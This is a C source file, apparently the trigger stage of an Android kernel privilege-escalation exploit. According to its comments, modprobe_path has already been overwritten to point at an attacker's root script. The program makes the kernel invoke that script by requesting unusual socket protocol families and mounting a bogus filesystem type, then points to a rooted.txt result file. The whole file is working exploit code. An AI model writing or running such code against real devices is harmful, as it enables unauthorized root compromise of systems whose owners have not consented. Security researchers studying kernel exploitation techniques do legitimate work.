/*
 * trigger_modprobe.c - Trigger kernel module load request
 *
 * This causes the kernel to call modprobe_path,
 * which we've overwritten to point to our root script.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <errno.h>

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Triggering modprobe via multiple methods...\n");

    /* Method 1: socket with bogus protocol family */
    printf("  [1] socket(PF_BLUETOOTH=31, SOCK_DGRAM, 0)... ");
    int s = socket(31, SOCK_DGRAM, 0);  /* PF_BLUETOOTH - may load module */
    if (s >= 0) { printf("succeeded (fd=%d)\n", s); close(s); }
    else printf("failed: %s\n", strerror(errno));

    /* Method 2: try more protocol families */
    int pfs[] = { 4, 5, 6, 9, 10, 11, 12, 15, 18, 20, 23, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 };
    for (int i = 0; i < sizeof(pfs)/sizeof(pfs[0]); i++) {
        s = socket(pfs[i], SOCK_DGRAM, 0);
        if (s >= 0) close(s);
    }
    printf("  [2] tried %d protocol families\n", (int)(sizeof(pfs)/sizeof(pfs[0])));

    /* Method 3: mount with bogus filesystem type */
    printf("  [3] mount bogus fs type... ");
    mkdir("/data/local/tmp/mnt_test", 0755);
    int rc = mount("/dev/block/mmcblk0", "/data/local/tmp/mnt_test",
                   "bogus_fs_type_xyz_12345", 0, NULL);
    printf("rc=%d: %s\n", rc, strerror(errno));
    rmdir("/data/local/tmp/mnt_test");

    printf("[*] All triggers done. Check /data/local/tmp/rooted.txt for results.\n");
    return 0;
}
